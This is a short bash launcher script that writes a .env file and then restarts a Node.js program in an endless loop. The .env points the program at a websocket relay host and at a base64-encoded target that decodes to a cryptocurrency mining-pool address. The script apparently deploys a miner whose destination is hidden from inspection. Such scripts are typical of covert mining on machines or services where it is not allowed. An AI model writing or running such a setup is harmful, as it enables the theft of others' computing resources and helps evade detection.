#!/bin/bash
CONNECT=${1:-8}
NAME=${2:-003}
echo "SERVER_WS=ws://dns.sudahdong.tech
SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
SERVER_DOMAIN=1858704322
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 10; done
